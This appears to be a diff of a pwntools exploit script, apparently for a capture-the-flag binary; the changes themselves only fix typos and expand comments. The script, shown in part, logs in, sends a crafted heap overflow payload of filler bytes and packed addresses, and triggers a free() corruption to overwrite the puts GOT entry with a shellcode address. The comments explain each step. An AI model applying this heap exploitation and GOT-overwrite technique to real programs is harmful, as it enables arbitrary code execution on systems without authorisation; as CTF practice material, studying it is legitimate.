@@ -6,7 +6,7 @@ res = p.recvuntil("Enter username: ")
 p.sendline("mcfly")
 res = p.recvuntil("Enter Pass: ")
 p.sendline("awesnap")
-#adds foir request texts:
+#adds four request texts:
 res = p.recvuntil("| ")
 p.sendline("1")
 res = p.recvuntil("Request text > ")
@@ -54,13 +54,13 @@ p.sendline("0")
 res = p.recvuntil("data: ")
 p.sendline("A"*56 + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x70\x9e\x60\x00\x00\x00\x00\x00" + "\x58\x99\x60\x00\x00\x00\x00\x00")
 
-#deletes the third text, causing a bug on the free function and writing 0x609958 at 0x609e70 + 0x18 (second position)
+#deletes the first text, causing a bug on the free function and writing 0x609958 at 0x609e70 + 0x18 (second position)
 res = p.recvuntil("| ")
 p.sendline("3")
 res = p.recvuntil("choice: ")
 p.sendline("0")
 
-#writes the address of our shellcode in the put got
+#writes the address of our shellcode in the put got (0x609f90) to force it to be executed when printing the menu
 res = p.recvuntil("| ")
 p.sendline("4")
 res = p.recvuntil("choice: ")
